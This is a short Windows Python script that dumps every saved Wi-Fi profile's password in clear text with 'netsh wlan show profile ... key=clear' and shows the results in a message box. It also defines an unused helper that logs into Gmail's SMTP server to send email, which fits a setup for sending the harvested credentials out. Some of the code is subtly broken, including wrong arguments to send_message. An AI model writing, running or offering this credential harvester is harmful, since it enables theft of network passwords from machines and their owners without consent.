#!/usr/bin/env python


import subprocess
import smtplib
import re
import ctypes


def send_email(from_email, to_email, password, messege):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(from_email, password)
    server.send_message(from_email, to_email, messege)
    server.quit()


def run_command(com):
    return subprocess.check_output(com, shell=True)


def mes_box(title, text, style):
    return ctypes.windll.user32.MessageBoxA(0, text, title, style)


passwords_list = ""
networks = run_command("netsh wlan show profile")
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
for network_name in network_names_list:
    net_details = run_command("netsh wlan show profile " + network_name + " key=clear")
    password = re.findall("(?:Key Content\s*:\s)(.*)", net_details)
    passwords_list += network_name[:-1]
    passwords_list += " : "
    if password:
        passwords_list += password[0]
    else:
        passwords_list += "no details" + "\n"
    passwords_list += "==========\n"
mes_box("WIFI passwords", passwords_list, 1)







